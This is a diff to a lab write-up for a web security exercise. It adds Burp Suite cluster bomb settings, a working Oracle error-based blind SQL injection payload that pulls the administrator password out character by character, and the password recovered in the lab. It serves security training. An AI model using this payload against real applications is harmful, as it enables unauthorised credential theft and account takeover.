@@ -61,8 +61,22 @@ To solve the lab, log in as the `administrator` user
 
 ### Bruteforcing Password
 
+- Use BurpSuite **CLUSTER BOMB ATTACK**.
+- **Payload 1 Configuration**
+    - `§1§` is the **INDEX VALUE**.
+    - `§1§` should contain numbers from 1 to **length of the password**.
+    - `Payload Type -> Numbers`, `Start -> 1`, `End -> length of password`, `Step -> 1`
+    - Testing each character from the **payload 2** wordlist against each index of the password value.
+- **Payload 2 Configuration**
+    - `§2§` is the **WORDLIST CHARACTER**.
+    - `§2§` will contain one character each line.
+    - `Payload Type -> Bruteforcer` , `Character Set -> abcdefghijklmnopqrstuvwxyz0123456789`, `Min Length -> 1 Max Length -> 1`
+    
+- If error is produced then **true** else **false**. It means if error then character matches index character value. Use the BurpSuite to look for these error requests. 
+
 ```sql
 ' AND (SELECT CASE WHEN SUBSTR(password,§1§,1)='§2§' THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
 ```
 
+- After bruteforcing I got the `administrator` password which is `aozfncuoqwo8ir1pqj8l`.
 
